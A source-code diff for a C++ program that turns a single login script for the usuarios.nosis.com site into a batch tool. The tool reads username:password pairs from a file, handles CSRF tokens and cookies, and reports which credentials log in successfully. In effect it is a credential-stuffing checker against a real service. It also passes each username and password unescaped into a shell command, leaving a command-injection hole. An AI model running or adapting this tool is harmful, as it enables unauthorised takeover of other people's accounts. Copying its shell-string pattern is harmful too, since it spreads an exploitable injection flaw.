@@ -1,11 +1,18 @@
 #include <cpr/cpr.h>
 #include <regex>
 #include <iostream>
+#include <fstream>
+#include <sstream>
+#include <string>
+#include <vector>
 #include <array>
 #include <memory>
-#include <stdexcept>
+
+
+#include "include/formater.hpp"
 
 using namespace std;
+
 
 // Ejecutar Node.js
 string ejecutar(const string& comando) {
@@ -27,15 +34,12 @@ string extraerCSRFToken(const string& html) {
     return "";
 }
 
-int main() {
+// Login para una credencial
+void login(const string& usuario, const string& clave) {
     const string url      = "https://usuarios.nosis.com/es";
     const string referer  = url;
     const string origin   = "https://usuarios.nosis.com";
     const string ua       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36";
-
-    //  CREDENCIALES: 
-    const string usuario = "USUARIO";
-    const string clave   = "CLAVE";
 
     // Paso 1: GET para obtener token y cookies
     auto get = cpr::Get(
@@ -50,25 +54,25 @@ int main() {
 
     if (get.status_code != 200) {
         cerr << "X Error de conexión (GET): HTTP " << get.status_code << endl;
-        return 1;
+        return;
     }
 
     string token = extraerCSRFToken(get.text);
     if (token.empty()) {
         cerr << "X Token CSRF no encontrado." << endl;
-        return 1;
+        return;
     }
 
-    cout << "CSRF Token obtenido.\n";
+    cout << "→ Procesando usuario: " << usuario << endl;
 
-    // Paso 2: cifrar usuario y clave con Node.js
+    // Cifrar usuario y clave usando Node.js
     string email_cif = ejecutar("node encrypt.js \"" + usuario + "\"");
     string clave_cif = ejecutar("node encrypt.js \"" + clave   + "\"");
 
     email_cif.erase(email_cif.find_last_not_of(" \n\r\t") + 1);
     clave_cif.erase(clave_cif.find_last_not_of(" \n\r\t") + 1);
 
-    // Paso 3: POST con valores cifrados y visibles vacíos
+    // POST con datos cifrados
     auto post = cpr::Post(
         cpr::Url{url},
         cpr::Header{
@@ -92,23 +96,54 @@ int main() {
         cpr::Cookies(get.cookies)
     );
 
-    cout << "\n ↓ HTML recibido:\n----------------------------\n";
-    cout << post.text.substr(0, 1000) << "...\n\n";
-
+    // Resultado del login
     if (post.status_code == 200) {
-        // Detectar login exitoso por elementos comunes de "Mi cuenta"
         if (post.text.find("cuenta.min.css") != string::npos ||
             post.text.find("Cerrar sesión") != string::npos ||
             post.text.find("Mi cuenta") != string::npos) {
-            cout << "✓ Login exitoso.\n";
+            cout << "✓ Login exitoso para usuario: " << usuario << endl;
         } else if (post.text.find("Clave o usuario incorrecto") != string::npos) {
-            cout << "X Credenciales incorrectas.\n";
+            cout << "X Credenciales incorrectas para usuario: " << usuario << endl;
         } else {
-            cout << "# No se pudo confirmar el login. HTML inesperado.\n";
+            cout << "# No se pudo confirmar login para " << usuario << ". HTML inesperado.\n";
         }
     } else {
-        cerr << "X Error POST: HTTP " << post.status_code << endl;
+        cerr << "X Error POST: HTTP " << post.status_code << " para usuario: " << usuario << endl;
+    }
+    cout << "------------------------------------------\n";
+}
+
+void reproductor() {
+    ifstream archivo("txts/output.txt");
+    if (!archivo.is_open()) {
+        cerr << "No se pudo abrir el archivo de credenciales.\n";
+        
     }
 
-    return 0;
+    string linea;
+    while (getline(archivo, linea)) {
+        if (linea.empty()) continue;
+
+        size_t separador = linea.find(':');
+        if (separador == string::npos) {
+            cerr << "⚠️  Formato inválido: " << linea << endl;
+            continue;
+        }
+
+        string usuario = linea.substr(0, separador);
+        string clave   = linea.substr(separador + 1);
+
+        login(usuario, clave);
+    }
+
+    
+}
+
+int main() {
+
+    formater();
+    if (formater_ended == true) {
+
+        reproductor();
+    }
 }
